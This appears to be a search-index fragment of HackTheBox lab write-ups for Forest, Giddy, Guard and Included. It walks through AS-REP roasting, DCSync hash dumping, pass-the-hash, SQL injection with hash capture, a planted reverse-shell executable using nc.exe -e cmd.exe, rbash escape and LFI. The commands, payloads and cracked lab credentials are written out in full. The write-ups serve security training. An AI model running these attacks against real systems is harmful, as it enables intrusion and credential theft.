Kerberos.</p>"},{"location":"HackTheBox/Forest/#smb","title":"SMB","text":"<p>I tried to enumerate shares with both <code>enum4linux</code> and <code>crackmapexec</code> but no luck here so I guess we can just move on.</p>"},{"location":"HackTheBox/Forest/#msrpc-and-foothold","title":"MSRPC and foothold","text":"<p>At this point I had an idea, I needed to enumerate domain users first so I connected to the MSRPC service and just got a list of them: </p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ rpcclient 10.10.10.161 -U '' -N                                                                              1 \u2a2f\nrpcclient $&gt; enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[DefaultAccount] rid:[0x1f7]\nuser:[$331000-VK4ADACQNUCA] rid:[0x463]\nuser:[SM_2c8eef0a09b545acb] rid:[0x464]\nuser:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]\nuser:[SM_75a538d3025e4db9a] rid:[0x466]\nuser:[SM_681f53d4942840e18] rid:[0x467]\nuser:[SM_1b41c9286325456bb] rid:[0x468]\nuser:[SM_9b69f1b9d2cc45549] rid:[0x469]\nuser:[SM_7c96b981967141ebb] rid:[0x46a]\nuser:[SM_c75ee099d0a64c91b] rid:[0x46b]\nuser:[SM_1ffab36a2f5f479cb] rid:[0x46c]\nuser:[HealthMailboxc3d7722] rid:[0x46e]\nuser:[HealthMailboxfc9daad] rid:[0x46f]\nuser:[HealthMailboxc0a90c9] rid:[0x470]\nuser:[HealthMailbox670628e] rid:[0x471]\nuser:[HealthMailbox968e74d] rid:[0x472]\nuser:[HealthMailbox6ded678] rid:[0x473]\nuser:[HealthMailbox83d6781] rid:[0x474]\nuser:[HealthMailboxfd87238] rid:[0x475]\nuser:[HealthMailboxb01ac64] rid:[0x476]\nuser:[HealthMailbox7108a4e] rid:[0x477]\nuser:[HealthMailbox0659cc1] rid:[0x478]\nuser:[sebastien] rid:[0x479]\nuser:[lucinda] rid:[0x47a]\nuser:[svc-alfresco] rid:[0x47b]\nuser:[andy] rid:[0x47e]\nuser:[mark] rid:[0x47f]\nuser:[santi] rid:[0x480]\n</code></pre> <p>With that we can try the ASPRoast attack.</p>"},{"location":"HackTheBox/Forest/#asproasting","title":"ASPRoasting","text":"<p>This attack take advantage of the Kerbetos flag <code>DONT_REQUIRE_PREAUTH</code>, allowing an attacker to get the hash of a domain user password to crack it offline. It is not common but maybe we are lucky:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt                                                 1 \u2a2f\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:c47eacb0574c80a88216f8e0abaa5368$e1bb99f94621eb4c55f70f7fcda83ebafde72babb5a873e85a95303985fef7de0251883fb44dd636cf64883b68ebdc845b7d64a4de4db4b0184ffab017b2b78e6a8b32af527b19a7a2b7a45fcbf32166214a782f943f9660de69b76bf3f72b56a2ef65c5b3272d7e46fef40fb7e2a2dfa8e4ddf5401d31436b8193c936b603329dbd7173fae90e43585c9295c97423de337216227842d6e8dabeb0114f23260d7bb6820eb6373b9ababe7cb5ec156863645f4426017fb115941dcf3c511e3002f91bc0d138fb341d77155217b22f8741b1fc535160143c972792ac95cc95f02d6040a98bcc30\n[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre> <p>And we got a hash! We can now use something like <code>john</code> to get the password with the Rockyou dictionary.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ john --wordlist=/home/kali/Wordlists/rockyou.txt hashes    \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ns3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     \n1g 0:00:00:01 DONE (2022-11-23 10:17) 0.5102g/s 2084Kp/s 2084Kc/s 2084KC/s s521379846..s3r2s1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>As you can see we have now credentials to login to the domain: <code>svc-alfresco:s3rvice</code>, I tested with <code>crackmapexec</code> if we can use Powershell remoting to get to the machine and looks like we are lucky:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice       \nSMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)\nHTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman\nWINRM       10.10.10.161    5985   FOREST           [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)\n</code></pre> <p>Using <code>evil-winrm</code> we can get a shell into the machine and get the user flag.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'            \n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt;\n</code></pre>"},{"location":"HackTheBox/Forest/#privilege-escalation","title":"Privilege escalation","text":""},{"location":"HackTheBox/Forest/#enumeration-process","title":"Enumeration process","text":"<p>First of all I used the BloodHound Windows collector to get information about the AD. For it, I hosted I samba share in my machine and just executed the binary from the target box. This is great to avoid some AVs:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc-alfresco&gt; \\\\10.10.14.20\\public\\windows\\tools\\SharpHound.exe\n...\n*Evil-WinRM* PS C:\\Users\\svc-alfresco&gt; download C:\\Users\\svc-alfresco\\20221123075411_BloodHound.zip /home/kali/20221123075411_BloodHound.zip\nInfo: Downloading C:\\Users\\svc-alfresco\\20221123075411_BloodHound.zip to /home/kali/20221123075411_BloodHound.zip\n\n\nInfo: Download successful!\n</code></pre> <p>I downloaded the collector results and we can now check for escalation vectors:</p> <p></p>"},{"location":"HackTheBox/Forest/#pwning-time","title":"Pwning time","text":"<p>Here is the idea, as <code>svc-alfresco</code> we can add ourselves to the group <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code> and then, since we would have <code>WriteDacl</code> permissions in the domain, we can just get <code>DCSync</code> rights and perform a DCSync attack.</p> <p>First, I loaded Powerview module to ease some things, you can do this manually too of course. Once that is ready, we can start adding the user <code>svc-alfresco</code> to the <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code> group:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco'\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Get-DomainUser svc-alfresco\n\n\nlogoncount                    : 8\nbadpasswordtime               : 12/31/1600 4:00:00 PM\ndistinguishedname             : CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local\nobjectclass                   : {top, person, organizationalPerson, user}\ndisplayname                   : svc-alfresco\nlastlogontimestamp            : 11/23/2022 7:13:55 AM\nuserprincipalname             : svc-alfresco@htb.local\nname                          : svc-alfresco\nobjectsid                     : S-1-5-21-3072663084-364016917-1341370565-1147\nsamaccountname                : svc-alfresco\nlogonhours                    : {255, 255, 255, 255...}\nadmincount                    : 1\ncodepage                      : 0\nsamaccounttype                : USER_OBJECT\naccountexpires                : 12/31/1600 4:00:00 PM\ncountrycode                   : 0\nwhenchanged                   : 11/23/2022 4:18:27 PM\ninstancetype                  : 4\nusncreated                    : 26083\nobjectguid                    : 58a51302-4c7c-4686-9502-d3ada3afaef1\nlastlogoff                    : 12/31/1600 4:00:00 PM\nobjectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local\ndscorepropagationdata         : {11/23/2022 4:19:02 PM, 11/23/2022 4:19:02 PM, 11/23/2022 4:19:02 PM, 11/23/2022 4:19:02 PM...}\ngivenname                     : svc-alfresco\nmemberof                      : {CN=Service Accounts,OU=Security Groups,DC=htb,DC=local, CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local}\nlastlogon                     : 11/23/2022 7:18:53 AM\nbadpwdcount                   : 0\ncn                            : svc-alfresco\nuseraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH\nwhencreated                   : 9/20/2019 12:58:51 AM\nprimarygroupid                : 513\npwdlastset                    : 11/23/2022 8:18:27 AM\nmsds-supportedencryptiontypes : 0\nusnchanged                    : 1182218\n</code></pre> <p>Now we have <code>WriteDacl</code>, so we can just add permissions to our user to perform the DCSync attack:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $user = \"htb\\svc-alfresco\"\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $pass = \"s3rvice\"\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $secstr = New-Object -TypeName System.Security.SecureString\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Add-DomainObjectAcl -Credential $cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\\Domain Admins' -Rights DCSync\n</code></pre> <p>I decided to use <code>impacket-secretsdump</code> to perform DCSync attack and get all the domain users NT hashes:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Public/windows/tools]\n\u2514\u2500$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::\n...\n[*] Cleaning up... \n</code></pre> <p>NOTE: The box will reset all the changes to the AD every 1 minute or so, keep that in mind while executing the commands because you won't make it if you are slow.</p> <p>Since we have the NT hash of the domain administrator, we can impersonate him and get the flag!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Forest]\n\u2514\u2500$ evil-winrm -i 10.10.10.161 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -s /home/kali/Documents/HTB/Forest\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nhtb\\administrator\n</code></pre>"},{"location":"HackTheBox/Giddy/","title":"Giddy","text":""},{"location":"HackTheBox/Giddy/#nmap-scan","title":"Nmap scan","text":"<p>I run a really basic scan to get all the open ports before this to speed the things a bit:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/OpenVPN/HTB]\n\u2514\u2500$ sudo nmap -sC -sV 10.10.10.104 -p80,443,3389,5985\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 13:10 EST\nNmap scan report for 10.10.10.104\nHost is up (0.053s latency).\n\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n443/tcp  open  ssl/http      Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite\n| Not valid before: 2018-06-16T21:28:55\n|_Not valid after:  2018-09-14T21:28:55\n|_ssl-date: 2022-02-27T18:11:07+00:00; +8s from scanner time.\n|_http-server-header: Microsoft-IIS/10.0\n| tls-alpn: \n|   h2\n|_  http/1.1\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: GIDDY\n|   NetBIOS_Domain_Name: GIDDY\n|   NetBIOS_Computer_Name: GIDDY\n|   DNS_Domain_Name: Giddy\n|   DNS_Computer_Name: Giddy\n|   Product_Version: 10.0.14393\n|_  System_Time: 2022-02-27T18:11:04+00:00\n|_ssl-date: 2022-02-27T18:11:07+00:00; +8s from scanner time.\n| ssl-cert: Subject: commonName=Giddy\n| Not valid before: 2021-12-14T12:25:29\n|_Not valid after:  2022-06-15T12:25:29\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7s, deviation: 0s, median: 7s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.23 seconds\n</code></pre> <p>Interesting, we have some things here:</p> <ul> <li>Ports 80 and 443: IIS web server.</li> <li>Port 3389: Remote desktop.</li> <li>Port 5985: Winrm service.</li> </ul> <p>Obviously this services tell us that this is a Windows box. Let's start checking what we can find.</p>"},{"location":"HackTheBox/Giddy/#iis-web-server","title":"IIS web server","text":"<p>Accesing the website just shows a dog photo, I mean that is nice because is a cute dog but not useful to find the flags. Time for a Gobuster scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/OpenVPN/HTB]\n\u2514\u2500$ gobuster dir -u http://10.10.10.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.104/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/02/27 13:21:20 Starting gobuster in directory enumeration mode\n===============================================================\n/remote               (Status: 302) [Size: 157] [--&gt; /Remote/default.aspx?ReturnUrl=%2fremote]\n/*checkout*           (Status: 400) [Size: 3420]\n/*docroot*            (Status: 400) [Size: 3420]                                              \n/mvc                  (Status: 301) [Size: 147] [--&gt; http://10.10.10.104/mvc/]                \n/*                    (Status: 400) [Size: 3420]\n</code></pre> <p>In the <code>/remote</code> directory we have a login to connect to a Powershell session (Handy if we get valid credentials) and in the <code>/mvc</code> directory we can see what looks like a shop or something like that.</p> <p>The shop allows to check the producs per category using an URL parameter. This parameter, called <code>ProductSubCategoryId</code>, is SQL injectable:</p> <pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 or 1=1\n</code></pre> <p>The above URL will display all the products of the database. I guess we can go with SQLMap now to enumerate the database, which is SQL server by the way.</p>"},{"location":"HackTheBox/Giddy/#sql-server","title":"SQL Server","text":"<p>I used SQLMap to search for something interesting in some of the databases but to be honest was worthless. I could not find any credentials or something that could help with the box but googling a bit I saw something cool.</p> <p>Using SQLMap I can easily get a DB shell and execute this command:</p> <pre><code>sql-shell&gt; exec master.dbo.xp_dirtree '\\\\10.10.14.43\\anything';\n</code></pre> <p>What the above command does is connect to a SMB server that I control. Using Responder it is possible to capture the NTLM hash that the SQL Server is gonna use to authenticate to the SMB server:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ sudo responder -I tun0 -v --lm \n...\n\n[+] Listening for events...\n\n[SMB] NTLMv2 Client   : ::ffff:10.10.10.104\n[SMB] NTLMv2 Username : GIDDY\\Stacy\n[SMB] NTLMv2 Hash     : Stacy::GIDDY:ca4e97cd4947f624:FBACC6F993864B9D7FD4C9BF5953D733:0101000000000000A8E1670A132CD80120D522789B1F9AA900000000020000000000000000000000\n[SMB] NTLMv2 Client   : ::ffff:10.10.10.104\n[SMB] NTLMv2 Username : GIDDY\\Stacy\n[SMB] NTLMv2 Hash     : Stacy::GIDDY:eb026b7aa03a8007:81BFACFB06B08C65ED16CD768B550BA9:0101000000000000D69B920A132CD8016B32F9AF32F3F4FF00000000020000000000000000000000\n</code></pre> <p>Notice the last Responder parameter I used, that will make clients use a LM hash intead of NTLM if possible. Since LM hashes are easier to crack using that parameter ease the next steps.</p>"},{"location":"HackTheBox/Giddy/#foothold","title":"Foothold","text":"<p>Time for cracking! I will use Jhon for this:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ john --wordlist=~/Wordlists/rockyou.txt hash\n...\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ john --show hash                                                                                             1 \u2a2f\nStacy:xNnWo6272k7x:GIDDY:e957fe38a7813b53:136D6064BDCCAB9ECF6A891C41B627E1:0101000000000000E0DE409A0E2CD801FB782F5985F9E8E400000000020000000000000000000000\n\n1 password hash cracked, 0 left\n</code></pre> <p>And we have credentials! <code>stacy:xNnWo6272k7x</code>. Remember the Winrm service? Let's check if we can use it:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/evil-winrm]\n\u2514\u2500$ ./evil-winrm.rb -i 10.10.10.104 -u stacy -p xNnWo6272k7x                                                     1 \u2a2f\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Stacy\\Documents&gt;\n</code></pre> <p>We are in! It is possible to use the Powershell thing in the web server but I prefer this. The user flag is under <code>C:\\Users\\Stacy\\Desktop\\user.txt</code>.</p>"},{"location":"HackTheBox/Giddy/#privesc","title":"Privesc","text":"<p>There is a file in the documents folder called <code>unifivideo</code>. Looks like is part of a program called Ubiquiti UniFi Video:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/evil-winrm]\n\u2514\u2500$ searchsploit unifivideo          \nExploits: No Results\nShellcodes: No Results\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/evil-winrm]\n\u2514\u2500$ searchsploit Ubiquiti UniFi Video\n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nUbiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass          | php/webapps/39268.java\nUbiquiti UniFi Video 3.7.3 - Local Privilege Escalation                            | windows/local/43390.txt\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>If the version is old enough we can scalate privileges. The thing is that this program is installed in <code>C:\\ProgramData\\unifi-video\\</code> which is world writtable (inherited from <code>C:\\ProgramData</code> by default) and the service run as Administrator.</p> <p>When the service starts or stops, it tries to load and execute <code>C:\\ProgramData\\unifi-video\\taskkill.exe</code>. The exploit here is that that executable does not exists by default, since we have permissions to modify the <code>C:\\ProgramData\\unifi-video\\</code> directory we could inject a malicious program instead.</p> <p>First I tried to generate the program using <code>msfvenom</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=3000 -f exe &gt; taskkill.exe\n</code></pre> <p>I uploaded the file to the box using the typical Python server trick and tried the exploit:</p> <pre><code># Atacker\npython3 -m http.server 8000\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\n# Victim\n*Evil-WinRM* PS C:\\ProgramData\\unifi-video&gt; wget 10.10.14.43:8000/taskkill.exe -outfile taskkill.exe\n\n# Atacker\nnc -lnvp 3000\nlistening on [any] 3000 ...\n\n# Victim\nStop-Service  \"Ubiquiti UniFi Video\"\nStart-Service  \"Ubiquiti UniFi Video\"\n</code></pre> <p>To my surprise... nothing happened, the malicious <code>taskkill.exe</code> was not in the directory anymore! The culprit here is probably Windows Defender or something similar. Time to create a custom executable to bypass this problem, first I need a way of compiling programs for Windows from Kali and <code>mingw-w64</code> is the answer. After that, time to use my C++ skills and craft a malicious program:</p> <pre><code>#include&lt;stdlib.h&gt;\n\nint main()\n{\n\n    system(\"nc.exe -e cmd.exe 10.10.14.43 3000\");\n    return 0;\n}\n</code></pre> <p>To compile it <code>mingw-w64</code> gives two options:</p> <ul> <li>i686-w64-mingw32-gcc for 32 bit Windows.</li> <li>x86_64-w64-mingw32-gcc for 64 bit Windows.</li> </ul> <p>I went with the 64 bits compiler, if something goes wrong I will use the other:</p> <pre><code>x86_64-w64-mingw32-gcc taskkill.cpp -o taskkill.exe\n</code></pre> <p>I got the Netcat binary from here. Repeating the exploit with the Netcat binary and the malicious <code>taskkill.exe</code> worked this time! The root flag is under <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>"},{"location":"HackTheBox/Guard/","title":"Guard","text":""},{"location":"HackTheBox/Guard/#nmap-scan","title":"Nmap scan","text":"<p>As usual here it comes!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 -v &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 15:16 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.037s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 19.96 seconds\n           Raw packets sent: 65553 (2.884MB) | Rcvd: 65536 (2.621MB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22 -sC -sV &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 15:17 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.036s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 2a:64:23:e0:a7:ec:1d:3b:f0:63:72:a7:d7:05:57:71 (RSA)\n|   256 b3:86:5d:3d:c9:d1:70:ea:d6:3d:36:a6:c5:f2:be:5d (ECDSA)\n|_  256 c0:5b:13:0f:d6:e6:d1:71:2d:55:e2:4a:e2:27:0e:c2 (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 2.64 seconds\n</code></pre> <p>Only ssh open, that may be a problem but looks like we can just use the <code>daniel</code> user private key to login so we are in the box now!</p>"},{"location":"HackTheBox/Guard/#scaping-rbash","title":"Scaping rbash","text":"<p>Once we establish a ssh connection we can see something... weird. The shell we have is really restricted and we can't even execute a simple <code>cat</code> welcome to Rbash!</p> <p>Luckily, since we are using ssh to connect, we can try to get a normal Bash shell:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Guard]\n\u2514\u2500$ ssh daniel@&lt;MACHINE_IP&gt; -i id_rsa -t bash\n</code></pre> <p>Now we can get the user flag under <code>/home/picasso/user.txt</code>.</p>"},{"location":"HackTheBox/Guard/#privilege-escalation","title":"Privilege escalation","text":"<p>The <code>daniel</code> user is part of the <code>sudo</code> group but we don't know the password yet. After a while looking around I found a copy of the <code>shadow</code> file that we have access to. Let's try to crack the hashes!</p> <p>Using <code>unshadow</code> to get a <code>john</code> compatible hash file from the <code>passwd</code> and <code>shadow</code> files we can get the <code>root</code> password using Rockyou:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Guard]\n\u2514\u2500$ john hash.txt --wordlist=~/Tools/Wordlists/rockyou.txt \nWarning: detected hash type \"sha512crypt\", but the string is also recognized as \"HMAC-SHA256\"\nUse the \"--format=HMAC-SHA256\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword#1       (root)\n</code></pre> <p>The root flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Included/","title":"Included","text":""},{"location":"HackTheBox/Included/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -sC -sV -p80          \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 20:33 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.052s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_Requested resource was http://&lt;MACHINE_IP&gt;/?file=index.php\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.56 seconds\n</code></pre> <p>Only port 80 open so let's check that website</p>"},{"location":"HackTheBox/Included/#port-80","title":"Port 80","text":"<p>Immediately i noticed that the URL was: <code>http://&lt;MACHINE_IP&gt;/?file=index.php</code> so i tried LFI with <code>http://&lt;MACHINE_IP&gt;/?file=../../../../../../etc/passwd</code>:</p> <pre><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin \n</code></pre> <p>So we have that. I tried <code>gobuster</code> and <code>wfuzz</code> to try to get more information about the files in the machine but nothing there. I even run a full port scan but no luck.</p>"},{"location":"HackTheBox/Included/#more-ports","title":"More ports?","text":"<p>I noticed that in the <code>passwd</code> file we can see a <code>tftp</code> user so maybe if we run an UDP scan with <code>nmap</code> we would find more open ports?</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sU &lt;MACHINE_IP&gt; -p69                                        130 \u2a2f\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 21:29 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.052s latency).\n\nPORT   STATE         SERVICE\n69/udp open|filtered tftp\n\nNmap done: 1 IP address (1 host up) scanned in 0.92 seconds\n</code></pre> <p>Ok so maybe we are starting to 